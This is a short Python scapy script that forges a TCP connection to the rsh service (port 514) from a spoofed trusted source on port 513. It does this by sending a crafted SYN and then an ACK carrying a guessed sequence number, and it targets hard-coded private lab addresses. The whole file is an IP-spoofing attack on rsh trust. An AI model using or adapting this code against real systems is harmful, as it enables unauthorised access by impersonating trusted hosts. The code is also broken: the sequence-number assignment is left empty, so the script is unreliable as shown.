#!/usr/bin/python
#coding=utf-8
from scapy.all import *

def spoofConn(src, tgt, ack):
	IPlayer = IP(src=src, dst=tgt)
	TCPlayer = TCP(sport=513, dport=514)
	synPkt = IPlayer / TCPlayer
	send(synPkt)

	IPlayer = IP(src=src, dst=tgt)
	TCPlayer = TCP(sport=513, dport=514, ack=ack)
	ackPkt = IPlayer / TCPlayer
	send(ackPkt)

src = "192.168.220.132"
tgt = "192.168.220.128"
seqNum = 
spoofConn(src, tgt, seqNum)